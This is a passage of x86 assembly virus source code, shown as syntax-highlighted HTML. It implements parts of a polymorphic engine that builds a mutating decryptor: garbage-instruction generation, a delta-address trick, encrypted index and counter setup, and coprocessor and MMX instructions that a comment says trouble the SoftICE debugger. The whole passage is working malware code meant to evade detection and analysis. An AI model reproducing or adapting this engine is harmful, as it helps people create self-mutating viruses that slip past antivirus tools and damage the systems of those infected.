        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_choose</span><span class="sc0">

        </span><span class="sc1">; finishing (PPE)...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code which will detect mmx support ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is one of the most important during build</span><span class="sc0">
        </span><span class="sc1">;the poly-decoder etc. The first, then we'll begin generate</span><span class="sc0">
        </span><span class="sc1">;garbage, we must test MMX - meanwhile we can generate</span><span class="sc0">
        </span><span class="sc1">;no copro/mmx garbage - as is jumps+move+math and so on.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_cpuid_mmx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; we can't generate copro &amp; MMX instruction</span><span class="sc0">
        </span><span class="sc1">; because we don't if CPU supports MMX and because we</span><span class="sc0">
        </span><span class="sc1">; don't have generated a global index register for copro</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__cpuid_mmx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to clear copro and mmx regs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Haha, this function is here only for it that SoftICE had</span><span class="sc0">
        </span><span class="sc1">;some problems. The say I must clear coprocessor then I'll</span><span class="sc0">
        </span><span class="sc1">;begin use copro-instructions. BUT ! I find out WinAMP also</span><span class="sc0">
        </span><span class="sc1">;don't clear them. So, I don't know - but never mind.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_copro_mmx_clear</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; test, if MMX is support</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">770Fh</span><span class="sc0">        </span><span class="sc1">;EMMS instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

        </span><span class="sc1">; reset copro-regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E3DBh</span><span class="sc0">       </span><span class="sc1">;FNINIT instruction</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; bye, bye</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to get delta-address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function get -actual- address of poly-loop.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_gd_call</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_get_delta</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; generate garbage but i don't copro !</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; prepare CALL</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gd_call</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_based</span><span class="sc0">

        </span><span class="sc1">; now, we must choose a global index register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;POP base-reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;'cause delta isn't finished</span><span class="sc0">

        </span><span class="sc1">; we must fix real address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_gd_call</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; ADD or SUB ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gd_sub</span><span class="sc0">

        </span><span class="sc1">; fix with ADD --&gt; add reg32, fix_value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gd_fix_done</span><span class="sc0">

        </span><span class="sc1">; fix with SUB --&gt; sub reg32, -fix_value</span><span class="sc0">
    </span><span class="sc5">__ppe_gd_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">__ppe_gd_fix_done</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to set index for decode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_index</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; crypt a start of decoding</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gi_nr_finish</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__ppe_gi_nr_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc1">; where I have save a index_reg ? base/copro/mmx ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gi_finish</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gi_copro</span><span class="sc0">

        </span><span class="sc1">; put value from b-reg to mmx-reg &amp; copro-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gi_finish</span><span class="sc0">

    </span><span class="sc5">__ppe_gi_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; mov b-reg32 to copro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reg2mov</span><span class="sc0">

    </span><span class="sc5">__ppe_gi_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg_get</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to set code value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; get random code to base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">

        </span><span class="sc1">; wow, very easy function...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate code to set counter random-value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ppe_get_counter</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc1">; get a random counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_value</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_vfinish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_vfinish</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gcount_nr_finish</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__ppe_gcount_nr_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; move to base or copro/mmx ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gcount_finish</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppe_gcount_copro</span><span class="sc0">

        </span><span class="sc1">; move to mmx-reg &amp; copro-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_reg_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_math_extended</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppe_gcount_finish</span><span class="sc0">

    </span><span class="sc5">__ppe_gcount_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; move to copro-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
